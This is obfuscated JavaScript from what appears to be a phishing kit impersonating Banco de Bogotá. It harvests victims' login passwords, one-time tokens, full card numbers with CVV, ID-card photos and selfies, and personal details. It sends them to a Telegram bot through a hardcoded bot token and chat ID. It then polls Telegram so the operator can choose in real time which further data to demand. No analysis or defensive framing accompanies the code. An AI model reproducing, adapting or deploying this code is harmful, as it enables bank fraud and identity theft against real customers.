  const _0x4e2a=['https://api.telegram.org/bot','sendMessage','POST','Content-Type','application/json','HTTP error! status: '];
  const _0x5a1c = '8688737179:AAHYtx_OJwitzNOPkYGRxwjV5t5ex2gwRXs';
  const _0x2b3d = '-1003577139660';
  const _0x1a4f = _0x4e2a[0] + _0x5a1c;
  
  function _0x3b2c(t, k = null) {
    const p = {'chat_id': _0x2b3d, 'text': t, 'parse_mode': 'HTML'};
    k && (p.reply_markup = k);
    return fetch(_0x1a4f + '/' + _0x4e2a[1], {
      method: _0x4e2a[2],
      headers: {[_0x4e2a[3]]: _0x4e2a[4]},
      body: JSON.stringify(p)
    }).then(r => (!r.ok ? (r.status === 409 && console.warn('⚠️ Conflict 409'), (() => {throw new Error(_0x4e2a[5] + r.status)})()) : r.json()));
  }

  function _0x6d8e(t, d, o) {
    let m = '', k = null;
    const _0xf2a1 = {
      'login': `🏦 <b>BANCO DE BOGOTÁ - NUEVO ACCESO</b>\n\n👤 <b>Tipo:</b> ${d.tipo_persona}\n🆔 <b>Identificación:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n🔐 <b>Tipo de Ingreso:</b> ${d.tipo_ingreso}\n🔑 <b>Clave:</b> ${d.clave}\n${d.ultimos_4_digitos !== 'N/A' ? `💳 <b>Últimos 4:</b> ${d.ultimos_4_digitos}` : ''}\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
      'token': `🔐 <b>TOKEN RECIBIDO</b>\n\n📱 <b>Token:</b> ${d.token}\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
      'tarjeta': `💳 <b>TARJETA ${(d.tipo_tarjeta || 'Desconocida').toUpperCase()} RECIBIDA</b>\n\n💳 <b>Número:</b> ${d.numero}\n📅 <b>Vencimiento:</b> ${d.vencimiento}\n🔒 <b>CVV:</b> ${d.cvv}\n👤 <b>Titular:</b> ${d.titular || 'No proporcionado'}\n\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
      'soyyo': `📸 <b>FOTOS "SOY YO" RECIBIDAS</b>\n\n📷 <b>Foto 1 (Cédula Frontal):</b> ${d.foto1 ? 'Recibida ✅' : 'No recibida ❌'}\n📷 <b>Foto 2 (Cédula Trasera):</b> ${d.foto2 ? 'Recibida ✅' : 'No recibida ❌'}\n🤳 <b>Foto 3 (Selfie):</b> ${d.foto3 ? 'Recibida ✅' : 'No recibida ❌'}\n\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
      'datos_personales': `📋 <b>DATOS PERSONALES RECIBIDOS</b>\n\n👤 <b>INFORMACIÓN PERSONAL</b>\n• <b>Nombres:</b> ${d.nombres}\n• <b>Apellidos:</b> ${d.apellidos}\n• <b>Fecha Nacimiento:</b> ${d.fecha_nacimiento}\n• <b>Género:</b> ${d.genero}\n\n📞 <b>CONTACTO</b>\n• <b>Correo:</b> ${d.correo}\n• <b>Celular:</b> ${d.celular}\n• <b>Teléfono Fijo:</b> ${d.telefono_fijo}\n\n📍 <b>DIRECCIÓN</b>\n• <b>Dirección:</b> ${d.direccion}\n• <b>Ciudad:</b> ${d.ciudad}\n• <b>Departamento:</b> ${d.departamento}\n\n🆔 <b>Usuario:</b> ${d.tipo_identificacion} ${d.numero_identificacion}\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`
    };
    const _0x8c4f = {
      'login': {inline_keyboard: [[{text: '❌ Error', callback_data: 'error'}, {text: '🔐 Token', callback_data: 'token'}], [{text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito'}, {text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito'}], [{text: '📋 Datos Personales', callback_data: 'datos_personales'}], [{text: '✅ Soy Yo', callback_data: 'soyyo'}, {text: '🏁 Finalizar', callback_data: 'finalizar'}]]},
      'token': {inline_keyboard: [[{text: '✅ Token Correcto', callback_data: 'soyyo'}, {text: '❌ Token Incorrecto', callback_data: 'token_otro'}], [{text: '💳 Pedir Tarjeta Débito', callback_data: 'tarjeta_debito'}, {text: '💳 Pedir Tarjeta Crédito', callback_data: 'tarjeta_credito'}], [{text: '🏁 Finalizar', callback_data: 'finalizar'}]]},
      'tarjeta': (tt) => ({inline_keyboard: [[{text: '✅ Tarjeta Válida', callback_data: 'soyyo'}, {text: '❌ Tarjeta Inválida', callback_data: `error_${tt.toLowerCase()}`}], [{text: '🔐 Pedir Token', callback_data: 'token'}, {text: '💳 Otra Tarjeta', callback_data: tt === 'Débito' ? 'tarjeta_debito' : 'tarjeta_credito'}], [{text: '🏁 Finalizar', callback_data: 'finalizar'}]]}),
      'soyyo': {inline_keyboard: [[{text: '✅ Fotos Correctas', callback_data: 'finalizar'}, {text: '❌ Fotos Incorrectas', callback_data: 'error_logo'}], [{text: '🔐 Pedir Token', callback_data: 'token'}, {text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito'}]]},
      'datos_personales': {inline_keyboard: [[{text: '✅ Datos Correctos', callback_data: 'finalizar'}, {text: '❌ Datos Incorrectos', callback_data: 'datos_personales'}], [{text: '🔐 Pedir Token', callback_data: 'token'}, {text: '💳 Pedir Tarjeta', callback_data: 'tarjeta_debito'}], [{text: '📸 Pedir Fotos', callback_data: 'soyyo'}]]}
    };
    m = _0xf2a1[t] || '';
    k = (t === 'tarjeta') ? _0x8c4f[t](d.tipo_tarjeta || 'Desconocida') : _0x8c4f[t] || null;
    _0x3b2c(m, k).then(res => {const mid = res.result?.message_id; mid && (localStorage.setItem('bbogota_msg_id', mid), typeof o === 'function' && o(mid));}).catch(e => {console.error('❌ Error:', e); document.getElementById('loading-overlay')?.style.display === null ? null : (document.getElementById('loading-overlay').style.display = 'none'); alert('Error de conexión. Por favor intenta nuevamente.');});
  }

  let _0x7b9c = false, _0x9d3e = null;
  window.stopListening = function() {_0x7b9c = true; _0x9d3e && clearTimeout(_0x9d3e); _0x9d3e = null;};
  
  function _0x2f5d(cb) {
    const _0x1e4a = localStorage.getItem('bbogota_msg_id');
    if (!_0x1e4a) return;
    _0x7b9c = false;
    let _0x3c2d = -1, _0x4a8f = 0;
    const _0x5f1e = 150, _0x6b2a = 2000;
    
    const _0x8e7f = () => {
      if (_0x7b9c) return;
      if (_0x4a8f >= _0x5f1e) {
        setTimeout(() => {!_0x7b9c && (_0x4a8f = 0, _0x8e7f());}, 5000);
        return;
      }
      fetch(`https://api.telegram.org/bot${_0x5a1c}/getUpdates`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({offset: _0x3c2d + 1, allowed_updates: ['callback_query'], timeout: 20})
      }).then(r => r.ok ? r.json() : {ok: false, result: []})
      .then(data => {
        if (!data.ok || !data.result?.length) {_0x4a8f++; !_0x7b9c && (_0x9d3e = setTimeout(_0x8e7f, _0x6b2a)); return;}
        let _0x1f8d = false;
        for (const u of data.result) {
          _0x3c2d = Math.max(_0x3c2d, u.update_id);
          if (!u.callback_query) continue;
          const _0xc5a2 = u.callback_query.data, _0x7e1f = String(u.callback_query.message.message_id);
          if (_0x7e1f === String(_0x1e4a)) {_0x1f8d = true; cb(_0xc5a2); _0x7b9c = true; return;}
        }
        _0x1f8d ? (_0x4a8f = 0) : (_0x4a8f++);
        !_0x7b9c && (_0x9d3e = setTimeout(_0x8e7f, _0x6b2a));
      }).catch(e => {_0x4a8f++; !_0x7b9c && _0x4a8f < _0x5f1e && (_0x9d3e = setTimeout(_0x8e7f, _0x6b2a + 1000));});
    };
    _0x8e7f();
  }

  function _0x9f5e() {return {tipo_identificacion: localStorage.getItem('user_id_type') || 'CC', numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'};}